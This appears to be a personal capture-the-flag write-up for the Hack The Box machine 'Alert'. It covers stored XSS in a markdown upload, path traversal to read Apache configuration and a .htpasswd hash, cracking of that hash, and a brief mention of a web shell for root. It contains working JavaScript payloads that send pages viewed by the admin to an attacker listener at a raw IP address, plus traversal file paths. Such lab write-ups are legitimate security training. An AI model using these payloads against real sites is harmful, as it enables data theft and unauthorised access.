# Alert HTB

nmap : 22 and 80

ffuf : statistics.alert.htb (login page) and alert.htb/messages

on the main website, XSS on markdown file upload (HTML interpration, therefore `<script>` also)

We can fetch some data and then send it bask to us. We can go even further and send this to the admin, and if he open the links, we will see what he sees (name of the attack ?)

> BIG WARNING
>
> You can't use python -m http.server as it don't support POST
> Instead use nc

Payload

```JavaScript
fetch('http://alert.htb/messages')
  .then(response => response.text())
  .then(data => {
    fetch('http://10.10.14.117:4444', {
      method: 'POST',
      body: data,
    });
  });
```

But nothing interesting. However, we that the main site is build with `alert.htb/index.php?file=`

ffuf on this and we get `alert.htb/index.php?file=messages`.

Sending the payload again and we get

```HTML
        <h1>Messages</h1><ul><li><a href='messages.php?file=2024-03-10_15-48-34.txt'>2024-03-10_15-48-34.txt</a></li></ul>
```

A new endpoint. Let's send it to the admin see what we can get.

```JavaScript
fetch('http://alert.htb/messages.php?file=./index.php')
  .then(response => response.text())
  .then(data => {
    fetch('http://10.10.14.117:4444', {
      method: 'POST',
      body: data,
    });
  });
```

Nothing. Let's try with ../index.php. It worked.

Found the default conf file : http://alert.htb/messages.php?file=../../../../etc/apache2/sites-enabled/000-default.conf

```conf
<Directory /var/www/statistics.alert.htb>
        Options Indexes FollowSymLinks MultiViews
        AllowOverride All
        AuthType Basic
        AuthName "Restricted Area"
        AuthUserFile /var/www/statistics.alert.htb/.htpasswd
        Require valid-user
    </Directory>
```

let's check ../../../../var/www/statistics.alert.htb/.htpasswd

```bash
<pre>albert:$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/
</pre>
```

let's crack this : `$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/:manchesterunited`

we got user !

For root, there is an open port on 8080 and the application is installed in /opt/

we can write some php files in there because we are in the management group. we can uplaod a revshell/webshell and it's all good !

